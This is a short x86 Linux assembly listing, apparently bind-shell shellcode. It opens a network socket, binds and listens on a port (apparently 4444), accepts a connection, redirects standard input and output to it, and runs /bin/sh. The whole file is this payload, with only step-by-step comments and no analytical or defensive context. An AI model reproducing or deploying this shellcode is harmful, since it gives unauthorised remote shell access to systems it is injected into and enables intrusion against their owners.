.section .text
.global _start
_start:
    # Create a socket
    push    $0x66
    pop     %eax
    xor     %ebx, %ebx
    push    %ebx
    inc     %ebx
    push    %ebx
    push    $0x2
    mov     %esp, %ecx
    int     $0x80
    # Bind the socket
    pop     %ebx
    pop     %esi
    xor     %edx, %edx
    push    %edx
    pushw   $0x5c11
    push    %edx
    push    $0x2
    push    $0x10
    push    %ecx
    push    %eax
    mov     %esp, %ecx
    mov     $0x66, %al
    int     $0x80
    # Listen on the socket
    mov     %eax, 4(%ecx)
    mov     $0x4, %bl
    mov     $0x66, %al
    int     $0x80
    # Accept a connection
    inc     %ebx
    mov     $0x66, %al
    int     $0x80
    xchg    %eax, %ebx
    pop     %ecx
loop:
    # Duplicate file descriptors
    mov     $0x3f, %al
    int     $0x80
    dec     %ecx
    jns     loop
shell:
    # Execute shell
    xor     %eax, %eax
    push    %eax
    push    $0x68732f2f
    push    $0x6e69622f
    mov     %esp, %ebx
    mov     %eax, %ecx
    mov     %eax, %edx
    mov     $0xb, %al
    int     $0x80
